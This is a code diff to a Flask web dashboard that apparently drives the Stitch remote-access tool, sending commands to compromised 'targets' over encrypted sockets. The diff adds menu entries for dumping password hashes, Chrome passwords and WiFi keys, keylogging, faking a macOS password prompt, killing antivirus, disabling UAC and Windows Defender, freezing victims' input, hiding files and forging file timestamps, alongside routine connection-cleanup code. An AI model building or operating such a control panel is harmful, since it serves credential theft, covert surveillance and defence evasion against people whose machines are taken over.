@@ -962,6 +962,10 @@ def execute_real_command(command, conn_id=None, parameters=None):
         
     except Exception as e:
         metrics_collector.increment_counter('command_errors')
+        # If there was a connection-related error, clean up context
+        if conn_id and ('connection' in str(e).lower() or 'socket' in str(e).lower() or 'timeout' in str(e).lower()):
+            connection_context.pop(conn_id, None)
+            log_debug(f"Cleaned up connection context for {conn_id} due to error: {str(e)}", "WARNING", "Cleanup")
         return f"❌ Error executing command: {str(e)}"
 
 # ============================================================================
@@ -1063,9 +1067,116 @@ COMMAND_DEFINITIONS = {
         'parameters': [
             {'name': 'text', 'type': 'text', 'prompt': 'Enter text to be displayed on login window', 'required': True}
         ],
-        'confirmation': False,
+        'confirmation': True,
         'dangerous': False,
         'macos_only': True
+    },
+    'hashdump': {
+        'parameters': [],
+        'confirmation': True,
+        'dangerous': True,
+        'confirmation_message': 'Are you sure you want to dump password hashes? This is a sensitive security operation.'
+    },
+    'keylogger': {
+        'subcommands': {
+            'start': {
+                'parameters': [],
+                'confirmation': True,
+                'dangerous': True,
+                'confirmation_message': 'Are you sure you want to start keylogging? This captures all user keystrokes.'
+            }
+        }
+    },
+    'chromedump': {
+        'parameters': [],
+        'confirmation': True,
+        'dangerous': True,
+        'confirmation_message': 'Are you sure you want to dump Chrome passwords? This extracts saved credentials.'
+    },
+    'wifikeys': {
+        'parameters': [],
+        'confirmation': True,
+        'dangerous': True,
+        'confirmation_message': 'Are you sure you want to extract WiFi passwords? This reveals network credentials.'
+    },
+    'askpassword': {
+        'parameters': [],
+        'confirmation': True,
+        'dangerous': False,
+        'confirmation_message': 'Are you sure you want to display a fake password prompt to the user?',
+        'macos_only': True
+    },
+    'avkill': {
+        'parameters': [],
+        'confirmation': True,
+        'dangerous': True,
+        'confirmation_message': 'Are you sure you want to attempt to kill antivirus processes? This disables system security.'
+    },
+    'disableRDP': {
+        'parameters': [],
+        'confirmation': True,
+        'dangerous': True,
+        'confirmation_message': 'Are you sure you want to disable Remote Desktop Protocol? This affects remote access.'
+    },
+    'disableUAC': {
+        'parameters': [],
+        'confirmation': True,
+        'dangerous': True,
+        'confirmation_message': 'Are you sure you want to disable User Account Control? This reduces Windows security.'
+    },
+    'disableWindef': {
+        'parameters': [],
+        'confirmation': True,
+        'dangerous': True,
+        'confirmation_message': 'Are you sure you want to disable Windows Defender? This disables antivirus protection.'
+    },
+    'freeze': {
+        'subcommands': {
+            'start': {
+                'parameters': [],
+                'confirmation': True,
+                'dangerous': True,
+                'confirmation_message': 'Are you sure you want to freeze mouse and keyboard input? This will lock out the user.'
+            }
+        }
+    },
+    'hide': {
+        'parameters': [
+            {'name': 'path', 'type': 'text', 'prompt': 'Enter file or directory path to hide', 'required': True}
+        ],
+        'confirmation': True,
+        'dangerous': False
+    },
+    'unhide': {
+        'parameters': [
+            {'name': 'path', 'type': 'text', 'prompt': 'Enter file or directory path to unhide', 'required': True}
+        ],
+        'confirmation': True,
+        'dangerous': False
+    },
+    'editaccessed': {
+        'parameters': [
+            {'name': 'file', 'type': 'text', 'prompt': 'File to modify', 'required': True},
+            {'name': 'timestamp', 'type': 'text', 'prompt': "Enter desired last accessed time ['MM/DD/YYYY HH:mm:ss']", 'required': True, 'placeholder': '01/01/2020 12:00:00'}
+        ],
+        'confirmation': True,
+        'dangerous': False
+    },
+    'editcreated': {
+        'parameters': [
+            {'name': 'file', 'type': 'text', 'prompt': 'File to modify', 'required': True},
+            {'name': 'timestamp', 'type': 'text', 'prompt': "Enter desired creation time ['MM/DD/YYYY HH:mm:ss']", 'required': True, 'placeholder': '01/01/2020 12:00:00'}
+        ],
+        'confirmation': True,
+        'dangerous': False
+    },
+    'editmodified': {
+        'parameters': [
+            {'name': 'file', 'type': 'text', 'prompt': 'File to modify', 'required': True},
+            {'name': 'timestamp', 'type': 'text', 'prompt': "Enter desired last modified time ['MM/DD/YYYY HH:mm:ss']", 'required': True, 'placeholder': '01/01/2020 12:00:00'}
+        ],
+        'confirmation': True,
+        'dangerous': False
     }
 }
 
@@ -1427,9 +1538,15 @@ def execute_on_target(socket_conn, command, aes_key, target_ip, parameters=None)
         except AttributeError as e:
             return output_header + f"❌ Command '{cmd_name}' not supported or requires parameters\n\nError: {str(e)}"
         except socket.timeout:
-            return output_header + "⚠️ Command timed out after 30 seconds.\n\nThe target may be slow, or the command is still executing."
+            # Clean up stale connection context on timeout
+            connection_context.pop(target_ip, None)
+            log_debug(f"Connection timeout for {target_ip}, cleared context", "WARNING", "Connection")
+            return output_header + "⚠️ Command timed out after 30 seconds.\n\nThe target may be slow, or the command is still executing.\nConnection context has been cleared - next command will re-establish handshake."
         except socket.error as e:
-            return output_header + f"❌ Connection error: {str(e)}\n\nTarget may have disconnected."
+            # Clean up stale connection context on socket error
+            connection_context.pop(target_ip, None)
+            log_debug(f"Socket error for {target_ip}, cleared context: {str(e)}", "WARNING", "Connection")
+            return output_header + f"❌ Connection error: {str(e)}\n\nTarget may have disconnected.\nConnection context has been cleared - next command will re-establish handshake."
         except Exception as e:
             import traceback
             return output_header + f"❌ Execution error: {str(e)}\n\nType: {type(e).__name__}\n\nTraceback: {traceback.format_exc()[-500:]}"
@@ -1588,6 +1705,26 @@ def download_file(filename):
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
+@app.route('/api/cleanup/connections', methods=['POST'])
+@login_required
+@limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
+def cleanup_connections():
+    """Manually trigger cleanup of stale connection contexts"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        cleaned_count = cleanup_stale_connections()
+        
+        log_debug(f"Manual cleanup triggered by {session.get('username')}, cleaned {cleaned_count} stale connections", "INFO", "Cleanup")
+        
+        return jsonify({
+            'success': True,
+            'cleaned_connections': cleaned_count,
+            'message': f'Cleaned up {cleaned_count} stale connection contexts'
+        })
+    except Exception as e:
+        log_debug(f"Error in manual cleanup: {str(e)}", "ERROR", "Cleanup")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
 # ============================================================================
 # WebSocket Events
 # ============================================================================
@@ -1602,14 +1739,7 @@ def handle_connect():
 def handle_disconnect():
     log_debug(f"WebSocket disconnected: {request.sid}", "INFO", "WebSocket")
     # Prune any stale contexts opportunistically
-    try:
-        server = get_stitch_server()
-        active = set(server.inf_sock.keys())
-        stale = [ip for ip in list(connection_context.keys()) if ip not in active]
-        for ip in stale:
-            connection_context.pop(ip, None)
-    except Exception:
-        pass
+    cleanup_stale_connections()
 
 @socketio.on('ping')
 def handle_ping():
@@ -1618,23 +1748,42 @@ def handle_ping():
 # ============================================================================
 # Background Tasks
 # ============================================================================
+def cleanup_stale_connections():
+    """Clean up stale connection_context entries for dropped connections"""
+    try:
+        server = get_stitch_server()
+        active_ips = set(server.inf_sock.keys())
+        stale_ips = []
+        
+        for ip in list(connection_context.keys()):
+            if ip not in active_ips:
+                stale_ips.append(ip)
+                connection_context.pop(ip, None)
+        
+        if stale_ips:
+            log_debug(f"Cleaned up {len(stale_ips)} stale connection contexts: {', '.join(stale_ips)}", "INFO", "Cleanup")
+        
+        return len(stale_ips)
+    except Exception as e:
+        log_debug(f"Error during connection cleanup: {str(e)}", "ERROR", "Cleanup")
+        return 0
+
 def monitor_connections():
     """Monitor and broadcast connection changes"""
     while True:
         try:
             server = get_stitch_server()
             active_count = len(server.inf_sock)
-            # Clean up connection_context entries for dropped connections
-            active_ips = set(server.inf_sock.keys())
-            for ip in list(connection_context.keys()):
-                if ip not in active_ips:
-                    connection_context.pop(ip, None)
+            
+            # Clean up stale connections
+            cleanup_stale_connections()
+            
             socketio.emit('connection_update', {
                 'active_connections': active_count,
                 'timestamp': datetime.now().isoformat()
             }, namespace='/')
-        except:
-            pass
+        except Exception as e:
+            log_debug(f"Error in connection monitor: {str(e)}", "ERROR", "Monitor")
         time.sleep(SERVER_RETRY_DELAY_SECONDS)
 
 def start_stitch_server():
